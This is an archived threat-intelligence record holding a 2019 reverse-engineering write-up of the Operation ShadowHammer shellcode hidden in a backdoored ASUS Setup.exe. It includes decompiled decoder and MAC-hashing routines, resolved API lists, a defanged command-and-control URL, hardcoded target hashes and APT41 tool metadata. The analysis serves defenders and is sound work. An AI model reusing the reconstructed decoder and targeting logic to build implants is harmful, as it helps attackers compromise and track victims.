{
    "id": "22acfa48-1e36-4d2d-9829-900e54f2d987",
    "created_at": "2023-01-12T15:00:22.556967Z",
    "updated_at": "2025-03-27T02:15:39.206431Z",
    "deleted_at": null,
    "sha1_hash": "f7828affb45dd3482e257af398b042d301d2c145",
    "title": "2019-03-28 - Let's Learn- Dissecting Operation ShadowHammer Shellcode Internals in crt_ExitProcess",
    "authors": "",
    "file_creation_date": "2022-05-28T04:40:36Z",
    "file_modification_date": "2022-05-28T04:40:36Z",
    "file_size": 533498,
    "plain_text": "# Let's Learn: Dissecting Operation ShadowHammer Shellcode Internals in crt_ExitProcess\n\n**[vkremez.com/2019/03/lets-learn-dissecting-operation.html](https://www.vkremez.com/2019/03/lets-learn-dissecting-operation.html)**\n\n## Goal: Reverse engineer and document the Operation ShadowHammer malware and its shellcode in-depth as it was originally discovered and reported by Kaspersky Labs. Source:\n\n Exclusive: Kaspersky researchers uncover operation #ShadowHammer - a supplychain attack targeting high-profile users. #KLResearch https://t.co/uyjK3lHP95 — Securelist (@Securelist) March 25, 2019\n\n Sample:\n Original Sample -> Setup.exe (MD5: 55a7aa5f0e52ba4d78c145811c830107)\n Outline:\n```\nI. Background & Summary \nII. Main Shellcode Decoder & Execution Function\nIII. GetAdaptersInfo Media Access Control (MAC) Parser\nIV. Compare MAC Computed MD5 Hash Against Hardcoded MD5 Set\nV. Call Command-and-Control Server Function\nVI. INI File Logger Function \nAppendix: Hardcoded Targeted MAC Addresses\n\n I. Background & Summary: Operation ShadowHammer is a newly discovered supply chain attack that leveraged ASUS Live Update software, originally discovered and reported by Kaspersky Labs. This case is interesting as it involves a lengthy targeting via the compromised supply chain attack vector. The attackers deploy an interesting shellcode within the backdoored ASUS \"Setup.exe,\" which is stored within “crt_ExitProcess” function. The main malware function contains a unique decoder blob with constants/XOR function that is responsible for decoding and executing its core shellcode. By and large, the shellcode performs MAC lookup logic for victims of interest via parsing GetAdaptersInfo API return and struct AdapterAddresses for physical devices media access control (MAC) numbers, which are oftentimes unique enough to identify PCs. Moreover, the malware shellcode deployed MD5Init, MD5Update, and MD5Final API calls to create an MD5 hash of the MAC address treated as byte object. The shellcode leverages the WININET library to call the server appending \"?\"+ unique identifier if there is a match with the identified hardcoded MD5 value and the victim machine MAC MD5. Otherwise, the shellcode is responsible for writing the file to the local user directory while altering the timestamps in the written file leveraging FileTimeToSystemTime and adding 0x93A80 => 604800 seconds => 7 days. It is, currently, one of the oddities of this malware. The purpose of this date alteration ahead is unclear at\n\n```\n\n-----\n\n## this time. The original MISP JSON, CSV, and STIX indicators of compromise (IOCs) as well as the raw extracted and decoded shellcode is available here on my GitHub. You can simply check if you are targeted by the MD5 MAC match by generating an MD5 value of physical device MAC addresses and comparing against the hardcoded MD5 ones from this malware sample as provided below.\n```\nII. Main Shellcode Decoder & Execution Function\nThe attackers deploy the shellcode decoder and execution routine within the ASUS\n\"Setup.exe\" as seen below.\n\n The \"shelldecoder\" function allocates the memory for the obfuscated shellcode, decodes it, and executes it. The decoding algorithm employed is allocated and written in two steps decoding the first 16 length blob of the encoded payload and then the rest with the same decoding algorithm:\n\n The main actual decoder algorithm function is peculiar and as follows (h/t @xorsthingsv2):\n\n```\n\n-----\n\n```\nint __stdcall decoder_func(int a1, int a2, int a3)\n{\n...\n memset(&v4, 0xCCu, 0x108u);\n v10 = 0;\n v9 = 0;\n v8 = *a1;\n v7 = *a1;\n v6 = *a1;\n v5 = *a1;\n do\n {\n  v8 = v8 + (v8 >> 3) - 0x11111111;\n  v7 = v7 + (v7 >> 5) - 0x22222222;\n  v6 += 0x33333333 - (v6 << 7);\n  v5 += 0x44444444 - (v5 << 9);\n  v9 = v5;\n  *(_BYTE *)(v10 + a3) = (v5 + v6 + v7 + v8) ^ *((_BYTE *)a1 + v10);\n  result = ++v10;\n }\n while ( v10 < a2 );\n return result;\n}\n\n## Next, the shellcode resolves a plethora of API calls via process environment block (PEB) traversal technique.\n///////////////////////////////////////////////////////\n/////////// OP ShadowHammer Resolved APIs ///////////////////\n///////////////////////////////////////////////////////\n0028FC48  76E250C1 kernel32.LoadLibraryExW\n0028FC4C  76E2C43A kernel32.VirtualAlloc\n0028FC50  76E2EF35 kernel32.GetModuleFileNameW\n0028FC54  76E18649 kernel32.WritePrivateProfileStringW\n0028FC58  76E2D816 kernel32.GetSystemTimeAsFileTime\n0028FC5C  76E2BE0D kernel32.FileTimeToSystemTime\n0028FC60  76E36B15 kernel32.VirtualFree\n0028FC64  770A4CC0 ntdll.memcpy\n0028FC68  770A3B2F ntdll.memcmp\n0028FC6C  770A5340 ntdll.memset\n0028FC70  7713A569 ntdll.swprintf\n0028FC74  7713A41F ntdll.sprintf\n0028FC78  770A5640 ntdll.strncat\n0028FC7C  77079DDC ntdll.MD5Init\n0028FC80  77079EA4 ntdll.MD5Update\n0028FC84  77079E16 ntdll.MD5Final\n0028FC88  72B36A4D IPHLPAPI.GetAdaptersAddresses\n0028FC8C  7618B880 WININET.InternetOpenA\n0028FC90  76246000 WININET.InternetOpenUrlA\n0028FC94  76187540 WININET.InternetQueryDataAvailable\n0028FC98  76181C80 WININET.InternetReadFile\n\n```\n\n-----\n\n## Then, the shellcode enters its main function responsible for obtaining and comparing MAC addresses and calling the server, among other functionality:\n```\n///////////////////////////////////////////////////////\n/////////// OP ShadowHammer Main Function ///////////////////\n///////////////////////////////////////////////////////\n....\n result = GetAdaptersInfo_Alloc(a1, 0, 1);\n if ( result > 0 )\n {\n  v3 = 20 * (result + 5);\n  hash_mac_alloc = VirtualAlloc(\n             0,\n             20 * (result + 5),\n             12288,\n             4);\n  memset(hash_mac_alloc, 0, v3);\n  result = GetAdaptersInfo_Alloc(v1, hash_mac_alloc, 0);\n  v4 = result;\n  if ( result > 0 )\n  {\n    memset(&v5, 0, 44);\n   if ( qmempy_memcmp_for_computed_md5_mac(v1, &v6, hash_mac_alloc, v4, (int)&v5)\n)\n    result = call_c2(v1, (int)&v5);\n   else\n    result = file_creation_log(v1);\n  }\n }\n return result;\n\n III. GetAdaptersInfo Media Access Control (MAC) Parser One of the most notable functions of the malware simply parses GetAdaptersInfo API return and struct AdapterAddresses for physical devices media access control (MAC) numbers via EDI+2C return, which is used to generate an MD5 hash value of the length 16 as seen below.\n\n```\n\n-----\n\n## The shortened pseudocoded function is as follows:\n hashta< MISP JSON/CSV/#STIX hashtawith the extracted raw shellcode to https://lnkd.in/dMcZJ_g\n\n\n-----\n\n```\n///////////////////////////////////////////////////////\n/////////// OP ShadowHammer Obtain & Hash MAC ///////////////////\n///////////////////////////////////////////////////////\n int __usercall GetAdaptersInfo_Alloc@<eax>(int a1@<esi>, int hash_match, int a3)\n{\n....\n v9 = 0;\n if ( GetAdaptersInfo (0, 0, 0, 0, &v9) == 0x6F )// 0x6F BUFFER_RUN_OVERFLOW\n {\n  VirtualAlloc_ret = VirtualAlloc(0, v9, 4096, 4);\n  if ( !GetAdaptersInfo(0, 0, 0, VirtualAlloc_ret, &v9) )\n   v7 = 0;\n   if ( VirtualAlloc_ret )\n   {\n    dest = hash_match;\n    do\n    {\n     if ( *(_DWORD *)(VirtualAlloc_ret + 52) > 0u )\n     {\n      if ( !a3 )\n      {\n       MD5Init(&MD5_CTX_context);\n       MD5Update(&MD5_CTX_context, VirtualAlloc_ret + 44, 6);// len = 6\n       MD5Final(&MD5_CTX_context);\n       memcpy(dest, &source, 16);\n      }\n      ++v7;\n      dest += 20;\n     }\n     VirtualAlloc_ret = *(_DWORD *)(VirtualAlloc_ret + 8);\n    }\n    while ( VirtualAlloc_ret );\n   }\n  }\n  result = v7;\n }\n else\n {\n  result = 0;\n }\n return result;\n\n## IV. Compare MAC Computed MD5 Hash Against Hardcoded MD5 Set The shellcode simply checks via memcmp API and parses the list of the hardcoded MD5 values against the machine generates MD5 MAC addresses via the following excerpt:\n\n```\n\n-----\n\n```\n///////////////////////////////////////////////////////\n///// OP ShadowHammer Compare MD5 Hash Excrept ////////\n///////////////////////////////////////////////////////\n  while ( 1 )\n {\n  v18 = *(_DWORD *)v20;\n  if ( v18 == 1 )\n  {\n   qmemcpy(&v13, v20, 0x2Cu);\n   v5 = 0;\n   v19 = 0;\n   if ( a4 )\n   {\n    mac_machine = a3;\n    while ( memcmp(&pre_computed, mac_machine, 16) )\n    {\n     ++v19;\n     mac_machine += 20;\n     if ( v19 >= a4 )\n      goto LABEL_9;\n    }\n    v5 = 1;\n   }\n\n## The matched excerpt list of the hardcoded MD5 hashes is as follows:\n///////////////////////////////////////////////////////\n///// OP ShadowHammer Hardcoded MD5 List //////////////\n///////////////////////////////////////////////////////\n00B006C7DAB6ACE6C25C3799EB2B6E14\n5977BAA3F8CE0CA1C96D6AC9A40C9A91\n409D8EEBCE8546E56A0AD740667AADBD\n7DA42DD34574D4E1A7EA0E708E7BC9A6\nADE62A257ADF118418C5B2913267543E\n4268AED64AA5FFF2020D2447790D7D32\n7B14C53FD3604CC1EBCA5AF4415AFED5\n3A8EA62E32B4ECBE33DF500A28EBC873\nCC16956C9506CD2BB389A7D7DA2433BD\nFE4CCC64159253A6019304F17102886D\nF241C3073A5777742C341472E2D43EEC\nAB0CEF9E5957129E23FBA178120FA20B\nF758024E734077C70532E90251C5DF02\nF35A60617AB336DE4DAAC799676D07B6\n6A62EAD801802A5C9EC828D0C1EDBB5B\n600C7B52E7F80832E3CEE84FCEC88B9D\n6E75B2D7470E9864D19E48CB360CAF64\nFB559BCD103EE0FCB0CF4161B0FAFB19\n690AD61EC7859A0964216B66B5D33B1A\n09DA9DF3A050AFAD0DF0EF963B41B6E2\nFAE3B06AB27F2B0F7C29BF7F2B03F83F\nD4B958671F47BF5DCD08705D80DE9A53\nV. Call Command-and-Control (C2) Server Function\n\n```\n\n-----\n\n## If the malware is able to match successfully the hardcoded MD5 values and the machine MAC MD5 address, it proceeds to the C2 call function; otherwise, it writes a .ini file. The C2 server call function is rather trivial relying on the WININET DLL and the following API calls ANSI-version InternetOpenA, InternetOpenUrlA, InternetReadFile, InternetQueryDataAvailable.\n\n The call appends and formats via sprintf API the URL to \"?\" and the unique identifier of the victim added to the URL string hxxps://asushotfix[.]com/logo2[.]jpg. VI. INI File Logger Function When the malware fails to find a match with the hardcoded MD5 MAC addresses, it calls this interesting .ini logger function essentially creating a file called \"idx.ini\" in directory with the timestamp set to +7 days from the current system timestamp. 2019-03-27 update (h/t @hFireF0X and @KyleHanslovan ): the shellcode leverages GetModuleFileNameW to drop the .ini file two directories deep from the initial execution path. For example, if the path is C:\\Users\\USER\\Desktop, it will drop the file to C:\\Users\\, if it is C:\\Program Files\\ASUS, it will drop the file to C:\\.\n\n The shellcode also sets up the time +7 days as it is one of the oddities of the malware.\n\n\n-----\n\n## The pseudo-coded function is as follows:\n```\n///////////////////////////////////////////////////////\n///// OP ShadowHammer Time Alter Function /////////////\n///////////////////////////////////////////////////////\n  memset((__int16 *)&v10, 0, 16);\n  GetSystemTimeAsFileFileTime(&v67);// GetSystemTimeAsFileFileTime\n  v3 = time_proc(v67 - 0x19DB1DED53E8000i64, 0x989680u, 0);\n  if ( v3 > 32535244799i64 )\n  {\n   LODWORD(v3) = 0xFFFFFFFF;\n   HIDWORD(v67) = 0xFFFFFFFF;\n  }\n  v4 = (signed int)v3 + 0x93A80 - 0x49EF6F00i64;// 0x93A80 = 604800 seconds = 7\ndays\n  HIDWORD(v5) = HIDWORD(v4) + 2;\n  LODWORD(v5) = v4;\n  v68 = time_proc(v5, 0x989680i64);\n  FileTimeToSystemTime(&v68, (__int16 *)&v10);\n  swnprintf(&v9, &v13, v10, v11, v12);\n  WritePrivateProfileStringW(&v58, &v42, &v9, (__int16 *)&v8);\n  WritePrivateProfileStringW(&v58, &v26, &v9, &v8);\n  result = WritePrivateProfileStringW(&v58, &v50, &v9, (__int16 *)&v8);\n }\n return result;\n}\n\n Appendix: Hardcoded Targeted MAC Addresses\n\n```\n\n-----\n\n```\n///////////////////////////////////////////////////////\n///// OP ShadowHammer Hardcoded MD5 List //////////////\n///////////////////////////////////////////////////////\n00B006C7DAB6ACE6C25C3799EB2B6E14\n5977BAA3F8CE0CA1C96D6AC9A40C9A91\n409D8EEBCE8546E56A0AD740667AADBD\n7DA42DD34574D4E1A7EA0E708E7BC9A6\nADE62A257ADF118418C5B2913267543E\n4268AED64AA5FFF2020D2447790D7D32\n7B14C53FD3604CC1EBCA5AF4415AFED5\n3A8EA62E32B4ECBE33DF500A28EBC873\nCC16956C9506CD2BB389A7D7DA2433BD\nFE4CCC64159253A6019304F17102886D\nF241C3073A5777742C341472E2D43EEC\nAB0CEF9E5957129E23FBA178120FA20B\nF758024E734077C70532E90251C5DF02\nF35A60617AB336DE4DAAC799676D07B6\n6A62EAD801802A5C9EC828D0C1EDBB5B\n600C7B52E7F80832E3CEE84FCEC88B9D\n6E75B2D7470E9864D19E48CB360CAF64\nFB559BCD103EE0FCB0CF4161B0FAFB19\n690AD61EC7859A0964216B66B5D33B1A\n09DA9DF3A050AFAD0DF0EF963B41B6E2\nFAE3B06AB27F2B0F7C29BF7F2B03F83F\nD4B958671F47BF5DCD08705D80DE9A53\nV. Call Command-and-Control (C2)\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-03-28 - Let's Learn- Dissecting Operation ShadowHammer Shellcode Internals in crt_ExitProcess.pdf"
    ],
    "report_names": [
        "2019-03-28 - Let's Learn- Dissecting Operation ShadowHammer Shellcode Internals in crt_ExitProcess.pdf"
    ],
    "threat_actors": [
        {
            "id": "1c97ccfd-1888-492c-b7b9-bb52c4c3809b",
            "created_at": "2023-01-06T13:46:38.940529Z",
            "updated_at": "2025-03-27T02:00:02.957652Z",
            "deleted_at": null,
            "main_name": "Operation ShadowHammer",
            "aliases": [],
            "source_name": "MISPGALAXY:Operation ShadowHammer",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "c7d9878a-e691-4c6f-81ae-84fb115a1345",
            "created_at": "2022-10-25T16:07:23.359506Z",
            "updated_at": "2025-03-27T02:02:09.752427Z",
            "deleted_at": null,
            "main_name": "APT 41",
            "aliases": [
                "BrazenBamboo",
                "Bronze Atlas",
                "Double Dragon",
                "Earth Baku",
                "Grayfly",
                "Operation ColunmTK",
                "Operation CuckooBees",
                "Operation ShadowHammer",
                "Red Kelpie",
                "SparklingGoblin",
                "TA415",
                "TG-2633"
            ],
            "source_name": "ETDA:APT 41",
            "tools": [
                "9002 RAT",
                "ADORE.XSEC",
                "ASPXSpy",
                "ASPXTool",
                "AceHash",
                "Agent.dhwf",
                "Agentemis",
                "AndroidControl",
                "AngryRebel",
                "AntSword",
                "BIOPASS",
                "BIOPASS RAT",
                "BLUEBEAM",
                "Barlaiy",
                "BlackCoffee",
                "Bladabindi",
                "BleDoor",
                "CCleaner Backdoor",
                "CHINACHOPPER",
                "COLDJAVA",
                "China Chopper",
                "ChyNode",
                "Cobalt Strike",
                "CobaltStrike",
                "Crackshot",
                "CrossWalk",
                "CurveLast",
                "CurveLoad",
                "DAYJOB",
                "DBoxAgent",
                "DEADEYE",
                "DEADEYE.APPEND",
                "DEADEYE.EMBED",
                "DEPLOYLOG",
                "DIRTCLEANER",
                "DUSTTRAP",
                "Derusbi",
                "Destroy RAT",
                "DestroyRAT",
                "DodgeBox",
                "DragonEgg",
                "ELFSHELF",
                "EasyNight",
                "Farfli",
                "FunnySwitch",
                "Gh0st RAT",
                "Ghost RAT",
                "HDD Rootkit",
                "HDRoot",
                "HKDOOR",
                "HOMEUNIX",
                "HUI Loader",
                "HidraQ",
                "HighNoon",
                "HighNote",
                "Homux",
                "Hydraq",
                "Jorik",
                "Jumpall",
                "KEYPLUG",
                "Kaba",
                "Korplug",
                "LATELUNCH",
                "LOLBAS",
                "LOLBins",
                "LightSpy",
                "Living off the Land",
                "Lowkey",
                "McRAT",
                "MdmBot",
                "MessageTap",
                "Meterpreter",
                "Mimikatz",
                "MoonBounce",
                "MoonWalk",
                "Motnug",
                "Moudour",
                "Mydoor",
                "NTDSDump",
                "PACMAN",
                "PCRat",
                "PINEGROVE",
                "PNGRAT",
                "POISONPLUG",
                "POISONPLUG.SHADOW",
                "POTROAST",
                "PRIVATELOG",
                "PipeMon",
                "PlugX",
                "PortReuse",
                "ProxIP",
                "ROCKBOOT",
                "RbDoor",
                "RedDelta",
                "RedXOR",
                "RibDoor",
                "Roarur",
                "RouterGod",
                "SAGEHIRE",
                "SPARKLOG",
                "SQLULDR2",
                "STASHLOG",
                "SWEETCANDLE",
                "ScrambleCross",
                "Sensocode",
                "SerialVlogger",
                "ShadowHammer",
                "ShadowPad Winnti",
                "SinoChopper",
                "Skip-2.0",
                "SneakCross",
                "Sogu",
                "Speculoos",
                "Spyder",
                "StealthReacher",
                "StealthVector",
                "TERA",
                "TIDYELF",
                "TIGERPLUG",
                "TOMMYGUN",
                "TVT",
                "Thoper",
                "Voldemort",
                "WIDETONE",
                "WINNKIT",
                "WINTERLOVE",
                "Winnti",
                "WyrmSpy",
                "X-Door",
                "XDOOR",
                "XMRig",
                "XShellGhost",
                "Xamtrav",
                "ZXShell",
                "ZoxPNG",
                "certutil",
                "certutil.exe",
                "cobeacon",
                "gresim",
                "njRAT",
                "pwdump",
                "xDll"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535622,
    "ts_updated_at": 1743041739,
    "ts_creation_date": 1653712836,
    "ts_modification_date": 1653712836,
    "files": {
        "pdf": "https://archive.orkl.eu/f7828affb45dd3482e257af398b042d301d2c145.pdf",
        "text": "https://archive.orkl.eu/f7828affb45dd3482e257af398b042d301d2c145.txt",
        "img": "https://archive.orkl.eu/f7828affb45dd3482e257af398b042d301d2c145.jpg"
    }
}